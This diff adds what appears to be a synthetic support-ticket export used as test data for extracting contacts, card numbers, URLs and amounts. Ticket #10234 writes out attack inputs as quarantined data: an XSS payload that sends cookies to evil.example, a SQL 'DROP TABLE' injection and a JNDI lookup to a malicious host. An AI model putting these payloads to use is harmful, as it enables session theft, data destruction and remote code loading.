@@ -1,0 +1,96 @@
+===================================================================
+SUPPORT TICKET EXPORT — batch_2026-09-04.log
+Source: legacy-crm-api/v2/tickets/export (raw dump, unfiltered)
+===================================================================
+
+Ticket #10231 opened 2026-09-01 09:14 AM
+Customer: Aline Uwase
+Contact: aline.uwase@gmail.com , backup contact aline_u98@yahoo.co.uk
+Phone (primary): +250 788 123 456
+Phone (alt, US format): (415) 555-0192
+Phone (mobile, no separators): 0792887129
+Notes: Customer says she registered with her school email
+       aline.uwase@alueducation.com but cannot log in. Her
+       alumni account alineu@alumni.alueducation.com still works fine.
+       Escalated to SI support desk: si.help@si.alueducation.com
+
+Ticket #10232 opened 2026-09-01 11:02am
+Customer requested a refund of $1,250.00 for order #88213. Our
+records show the charge was RWF 45,000 (approx). Card on file:
+4539 1488 0343 6467 (Visa test card, do NOT charge again).
+Second card attempt failed: 6011-0009-9013-9424 (Discover).
+A clearly bogus number was also submitted by a bot: 1234 5678 9012 3456
+— this fails the checksum and must be rejected.
+
+Ticket #10233 — chat transcript excerpt --------------------------
+[10:41:03] agent: Please visit https://support.alueducation.com/tickets/10233?ref=chat
+[10:41:20] agent: You can also check our status page at http://status.alu.dev/
+[10:41:44] customer: ok, and the invoice pdf is at
+           https://billing.example.com/invoices/2026/09/INV-98213.pdf?token=abc123&user=44
+[10:42:01] customer: my personal site is www.uwase-portfolio.rw (no https, ugh)
+[10:42:10] agent: noted — tweeting about this issue? tag us #ALUSupport or #CustomerCare2026
+           also trending today: #250Tech and #MadeInRwanda
+[10:42:30] customer: will do! also saw a promo, 30% off, total is €89.99 or about ¥14,200
+
+Ticket #10234 — SECURITY FLAG (input sanitized before storage) ---
+Raw field as submitted by client (DO NOT execute, for audit only):
+  name: <script>alert('xss')document.location='http://evil.example/steal?c='+document.cookie</script>
+  comment: '); DROP TABLE tickets;--
+  comment2: {{7*7}}${jndi:ldap://malicious.example.com/a}
+  email: not-a-real-email@@@bad..domain,com
+  phone: 000-000-0000000000000 (invalid, too many digits)
+  card: 4111-1111-1111-111 (13 digits, malformed — must be rejected)
+Agent note: none of the above should be extracted as valid structured
+data; the ticket was auto-flagged by the WAF and quarantined.
+
+Ticket #10235 opened 2026-09-02 3:47 PM
+Customer: John Mugisha <john.mugisha@alumni.alueducation.com>
+Subject: Payment confirmation
+Body: Thanks for confirming, the transaction of KES 3,500.00 went
+through around 14:05 (24h) / 2:05 PM. My work line is 0788-123-456
+and international format is +1 (650) 555-0123 ext. 22.
+Reference invoice: https://pay.alustudent.com/receipts/9981
+New card used: 5555 5555 5555 4444 (Mastercard, valid test number).
+Old card on file was 378282246310005 (Amex, valid test number) but
+it's expired.
+
+Ticket #10236 — social team notes ---------------------------------
+Campaign mentions: #GraduationDay2026 #ALUFamily #TechForGood
+Sponsor link: http://bit.ly/3xAmPl3 and https://alueducation.com/news?id=204
+Budget approved: $12,000.00 USD, additional RWF 2,000,000 reserve.
+Contact for approvals: finance.desk@alueducation.com and
+cc: registrar@si.alueducation.com, si-admin@si.alueducation.com
+
+Ticket #10237 — flagged by spam filter, held for review -----------
+Submission came through the public contact form with several fields
+that don't pass basic validation; support lead asked that it be kept
+on file rather than deleted, in case the sender follows up.
+  email given: john@@doe..com
+  email given (2nd field): @missinglocal.com
+  callback number: 12345
+  "website" field: htp:/broken-url..com
+  tag entered in comments: # not a hashtag (space after hash)
+  card number attempted: 4242-4242-4242 (too short)
+  raw bytes from the form (should have been stripped client-side):
+  \x00\x1b[31mFAKE\x1b[0m
+Agent note: form data looks auto-generated / bot traffic, nothing here
+should be treated as a real contact detail.
+
+Ticket #10238 — misc numbers logged from other channels ------------
+Collected from a few different support channels this week, formats
+are all over the place as usual.
+Customer support line (US, dot-separated): 555.123.4567
+UK office line: +44 20 7946 0958
+Kenyan desk (trunk code in brackets): +254 (0) 712 345678
+Invoice total, no separator this time: 1250 USD
+Small transaction fee: $0.99
+Receipt rounding: GBP 45.5
+Price quoted by a local vendor (they use Ksh, not one of ours):
+  Ksh 2,500
+Setup guide link they were sent: https://docs.alueducation.com/guide/setup#step-3
+Ops paged about the monitoring box again: http://192.168.1.42:8080/status
+Also got this in an email signature, not a link to follow up on:
+  mailto:support@alueducation.com
+===================================================================
+END OF EXPORT
+===================================================================
